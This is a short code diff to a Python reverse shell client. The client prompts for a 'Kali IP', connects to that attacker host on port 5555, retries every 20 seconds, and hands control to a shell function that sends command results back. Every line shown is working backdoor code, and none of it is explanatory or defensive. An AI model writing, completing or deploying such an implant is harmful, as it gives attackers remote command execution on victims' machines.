@@ -16,11 +16,13 @@ def reliable_recv():
         except ValueError:
             continue
 
-def connection(kali_ip, port):
+ip = str(input("Insert your Kali IP:\n"))
+
+def connection(kali_ip):
     while True:
         time.sleep(20)
         try:
-            s.connect((kali_ip, port))
+            s.connect((kali_ip, 5555))
             shell()
             s.close()
             break
@@ -39,4 +41,4 @@ def shell():
             reliable_send(result)
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-connection()
+connection(ip)
